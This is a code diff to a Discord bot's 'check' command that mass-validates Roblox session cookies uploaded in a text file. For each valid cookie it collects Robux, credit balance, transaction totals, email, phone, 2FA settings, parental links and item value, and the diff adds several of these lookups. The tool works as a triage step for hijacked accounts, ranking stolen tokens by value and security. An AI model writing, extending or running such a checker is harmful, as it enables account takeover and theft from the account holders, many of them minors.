@@ -1,10 +1,15 @@
 import {
   SlashCommandBuilder,
   PermissionFlagsBits,
+  ActionRowBuilder,
+  ButtonBuilder,
+  ButtonStyle,
+  EmbedBuilder,
   type ChatInputCommandInteraction,
   type MessageComponentInteraction,
   MessageFlags,
 } from 'discord.js';
+import axios from 'axios';
 import * as Roblox from '../../lib/roblox-api';
 import {
   buildSuccessEmbed,
@@ -12,37 +17,16 @@ import {
   buildInvalidCookieEmbed,
   buildIpLimitEmbed,
   buildProgressEmbed,
-  buildAccountEmbed,
+  buildBaseEmbed,
 } from '../../lib/embed-helpers';
 import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
 import { logger } from '../../lib/logger';
 import type { Command } from './types';
 
-function extractCookiesFromLabeled(text: string): string[] {
-  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
-  const cookies: string[] = [];
-  let currentCookie: string | null = null;
+const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
+const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
 
-  for (const line of lines) {
-    const lower = line.toLowerCase();
-    if (lower.startsWith('cookie') && line.includes(':')) {
-      const parts = line.split(':');
-      if (parts.length >= 2) {
-        const value = parts.slice(1).join(':').trim();
-        if (value) {
-          currentCookie = value;
-          cookies.push(currentCookie);
-          currentCookie = null;
-        }
-      }
-    }
-  }
-  return cookies;
-}
-
-function extractCookiesRegex(text: string): string[] {
-  const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
-  const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
+function extractCookies(text: string): string[] {
   const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
   const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
   const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
@@ -60,107 +44,12 @@ function extractCookiesRegex(text: string): string[] {
   return result;
 }
 
-function extractCookies(text: string): string[] {
-  const trimmed = text.trim();
-  if (trimmed.toLowerCase().includes('cookie') && trimmed.includes(':')) {
-    const labeled = extractCookiesFromLabeled(trimmed);
-    if (labeled.length > 0) {
-      return labeled;
-    }
-  }
-  return extractCookiesRegex(trimmed);
-}
-
-async function fetchRobux(cookie: string, userId: string): Promise<number> {
-  try {
-    const resp = await fetch(
-      `https://economy.roblox.com/v1/users/${userId}/currency`,
-      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
-    );
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { robux: number };
-      return data.robux || 0;
-    }
-  } catch {}
-  return 0;
-}
-
-async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
-  try {
-    const resp = await fetch(
-      `https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`,
-      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
-    );
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { incomingRobuxTotal: number; outgoingRobuxTotal: number };
-      return { incoming: data.incomingRobuxTotal || 0, outgoing: data.outgoingRobuxTotal || 0 };
-    }
-  } catch {}
-  return { incoming: 0, outgoing: 0 };
-}
-
-async function fetchCountry(cookie: string): Promise<string> {
-  try {
-    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { value: { countryName: string } };
-      return data.value?.countryName || 'Unknown';
-    }
-  } catch {}
-  return 'Unknown';
-}
-
-async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null; pending: string | null }> {
-  try {
-    const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { emailAddress: string; verified: boolean; canBypassPasswordForEmailUpdate: boolean };
-      return { verified: data.verified ? data.emailAddress : null, pending: null };
-    }
-  } catch {}
-  return { verified: null, pending: null };
-}
-
-async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
-  try {
-    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-    });
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { parents: unknown[]; canAddParent: boolean };
-      return { hasParent: (data.parents && data.parents.length > 0) || false };
-    }
-  } catch {}
-  return { hasParent: false };
-}
-
-async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
-  try {
-    const resp = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`,
-      { headers: { 'User-Agent': 'Mozilla/5.0' } }
-    );
-    if (resp.status === 200) {
-      const data = (await resp.json()) as { data: { imageUrl: string }[] };
-      if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
-        return data.data[0].imageUrl;
-      }
-    }
-  } catch {}
-  return null;
-}
-
 const data = new SlashCommandBuilder()
   .setName('check')
   .setDescription('Mass Checking File')
-  
   .addAttachmentOption((opt) =>
     opt.setName('file')
-      .setDescription('A .txt file containing cookies (supports labeled format)')
+      .setDescription('A .txt file containing cookies')
       .setRequired(true),
   ) as SlashCommandBuilder;
 
@@ -170,22 +59,26 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
     const attachment = interaction.options.getAttachment('file', true);
     if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
-      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
+      const embed = buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.');
+      await interaction.editReply({ embeds: [embed] });
       return;
     }
 
     let fileContent: string;
     try {
-      const resp = await fetch(attachment.url);
-      fileContent = await resp.text();
-    } catch {
-      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
+      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
+      fileContent = resp.data;
+    } catch (err: any) {
+      logger.error({ err }, 'File download failed in check');
+      const embed = buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file. Please try again.');
+      await interaction.editReply({ embeds: [embed] });
       return;
     }
 
     const cookies = extractCookies(fileContent);
     if (cookies.length === 0) {
-      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ No valid cookie tokens found in the file.')] });
+      const embed = buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain `_|WARNING...|_CAEQ…` or bare `CAEQ…` tokens.');
+      await interaction.editReply({ embeds: [embed] });
       return;
     }
 
@@ -202,17 +95,25 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       validCount++;
       const userId = validation.userId!;
       const age = await Roblox.getUserAge(userId);
-      const robux = await fetchRobux(rawCookie, String(userId));
-      const summary = await fetchTransactionTotals(rawCookie, String(userId));
-      const country = await fetchCountry(rawCookie);
-      const email = await fetchEmailInfo(rawCookie);
-      const parental = await fetchParentalControls(rawCookie);
-      const thumb = await fetchAvatarThumbnail(String(userId));
+      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
+      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
+      const country = await Roblox.fetchCountry(rawCookie);
+      const email = await Roblox.fetchEmailInfo(rawCookie);
+      const parental = await Roblox.fetchParentalControls(rawCookie);
+      const thumb = await Roblox.fetchAvatarThumbnail(String(userId));
+      const credit = await Roblox.fetchCreditBalance(rawCookie);
+      const twoStep = await Roblox.fetchTwoStepConfig(rawCookie, String(userId));
+      const phone = await Roblox.fetchPhoneInfo(rawCookie);
+      const rap = await Roblox.fetchRolimonsRAP(String(userId));
       totalRobux += robux;
 
       let emailStatus = 'No email';
       if (email.verified) emailStatus = '✅ Verified';
       else if (email.pending) emailStatus = '⏳ Pending';
+
+      const twoStepStatus = `📧 ${twoStep.email ? '✅' : '❌'} Email 2FA | 🔐 ${twoStep.authenticator ? '✅' : '❌'} Authenticator`;
+      const phoneStatus = phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone';
+      const balance = `${credit.balance} ${credit.currency}`;
 
       const id = Math.random().toString(36).slice(2, 10);
       const row = buildCopyButtons(id, 'check', rawCookie, false);
@@ -228,7 +129,15 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         emailStatus,
         parental.hasParent ? '✅ Linked' : '❌ None',
         thumb
+      )
+      .addFields(
+        { name: '💰 Balance', value: balance, inline: true },
+        { name: '📞 Phone', value: phoneStatus, inline: true },
+        { name: '🔐 2FA', value: twoStepStatus, inline: false },
+        { name: '📈 RAP', value: rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE', inline: true },
+        { name: '⭐ Premium', value: rap.premium ? '✅ Yes' : '❌ No', inline: true }
       );
+
       await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
     }
 
@@ -240,7 +149,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
   } catch (err: any) {
     logger.error({ err }, 'Check command error');
-    await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
+    await interaction.editReply({
+      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
+    });
   }
 }
 
